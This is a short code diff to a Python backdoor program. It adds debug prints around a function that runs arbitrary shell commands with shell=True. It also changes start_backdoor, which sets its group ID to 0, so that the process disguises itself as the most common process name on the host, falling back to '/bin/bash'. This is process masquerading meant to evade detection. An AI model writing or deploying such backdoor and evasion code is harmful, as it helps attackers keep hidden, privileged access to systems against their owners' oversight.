@@ -90,7 +90,9 @@ def run_commands(command):
     :return: str of output
     """
     # result = subprocess.run(['ls', '-l'], capture_output=True, text=True).stdout
+    print("start")
     result2 = subprocess.run(command, capture_output=True, text=True, shell=True).stdout
+    print("ends")
     print(result2)
     return result2
 
@@ -107,7 +109,26 @@ def start_backdoor():
     setgid(0)
 
     # Change process name
-    setproctitle.setproctitle("Super Secret Process")
+    try:
+        # Gets last column of ps (process status), the process names.
+        cmd1 = "ps -e -o command"
+        # Gets each unique (process name), and number of duplicates
+        cmd2 = "uniq -c"
+        # Sort by ascending order of first field/column (num of dups).
+        cmd3 = "sort -nr --key=1,1"
+        # Keep the first line of output (highest dups)
+        cmd4 = "head -n 1"
+        # Removes the first column (# of dups)
+        cmd5 = "awk '{$1=\"\"}1'"
+        # Removes the leading space delimiter after cutting out first column
+        cmd6 = "awk '{$1=$1}1"
+        # ps -e -o command | uniq -c | sort -nr --key=1,1 | head -n 1 | awk '{$1=""}1' | awk '{$1=$1}1'
+        get_highest_dup_process_name = "ps -e -o command | uniq -c | sort -nr --key=1,1 | head -n 1 | awk '{$1=\"\"}1' | awk '{$1=$1}1' "
+        output = run_commands(get_highest_dup_process_name)
+        setproctitle.setproctitle(output)
+    except Exception:
+        # If failed, default to /bin/bash as process name.
+        setproctitle.setproctitle("/bin/bash")
     u_input = input()
     return
 
